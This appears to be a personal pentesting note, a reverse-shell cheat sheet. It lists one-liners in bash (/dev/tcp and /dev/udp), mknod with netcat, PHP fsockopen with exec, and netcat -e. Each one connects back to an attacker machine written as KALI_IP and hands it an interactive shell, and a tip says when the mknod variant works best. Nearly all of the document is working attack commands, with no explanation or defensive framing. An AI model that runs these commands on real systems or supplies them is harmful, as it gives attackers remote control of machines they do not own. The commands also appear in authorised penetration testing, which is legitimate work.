
## Bash

```bash
sh -i >& /dev/tcp/KALI_IP/9001 0>&1
```

```bash
sh -i >& /dev/udp/KALI_IP/9001 0>&1
```

## mknod

```bash
mknod backpipe p; nc KALI_IP 31337 0<backpipe | /bin/bash 1>backpipe
```
>[!tip]
>This reverse shell typically works well when bash reverse shells aren't available.
## PHP

#### Command line:
```bash
php -r '$sock=fsockopen("KALI_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("KALI_IP",9001);shell_exec("sh <&3 >&3 2>&3");'
```

## Netcat
```bash
nc KALI_IP 9001 -e sh
```

## Referenced In
```dataview
list from [[]] and !outgoing([[]])
```